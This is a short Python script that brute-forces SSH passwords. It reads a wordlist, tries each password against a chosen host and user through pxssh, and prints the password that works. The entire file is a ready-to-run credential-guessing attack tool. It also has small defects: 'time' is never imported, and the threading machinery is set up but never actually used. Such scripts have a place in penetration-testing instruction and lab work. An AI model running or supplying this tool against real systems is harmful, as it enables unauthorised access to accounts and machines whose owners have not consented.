#! /usr/bin/python3
# _*_ coding:utf-8 _*_

__author__ = 'Junliang.Zhong'

import pxssh
import optparse
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value = maxConnections)
Found = False
Fails = 0

def connect(host, user, password, release):
	global Found
	global Fails
	try:
		s = pxssh.pxssh()
		s.login(host, user, password)
		s.sendline('ls')
		s.prompt()
		print('[+] Password Found: ' + password)
		Found = True
		s.logout()
	except Exception as e:
		if 'read_nonblocking' in str(e):
			Fails += 1
			time.sleep(5)
			connect(host, user, password, False)
		elif 'synchronize with original prompt' in str(e):
			time.sleep(1)
			connect(host, user, password, False)
	finally:
			if release:
				connection_lock.release()

def main():

	global Found
	global Fails

	parser = optparse.OptionParser('usage%prog -H <target host> -u <user> -F <password list File>')
	parser.add_option('-H', dest = 'tgtHost', type = 'string', help = 'specify the host')
	parser.add_option('-u', dest = 'user', type = 'string', help = 'specify the user')
	parser.add_option('-F', dest = 'passwdFile', type = 'string', help = 'specify the passwords list file')

	(options, args) = parser.parse_args()
	host = options.tgtHost
	user = options.user
	passwdFile = options.passwdFile

	if host == None or passwdFile == None or user == None :
		print(parser.usage)
		exit(0)

	fn = open(passwdFile, 'r')
	for line in fn.readlines():		
		connection_lock.acquire()
		password = line.strip('\r').strip('\n')
		print('[-] Testing: ' + str(password))
		connect(host, user, password, True) 
		if Found:
			print('[*] Exiting: Password Found')
			exit(0)
		if Fails > 5 :
			print('[!] Exiting: Too Many Socket Timeouts')
			exit(0)


if __name__ == '__main__':
	main()

	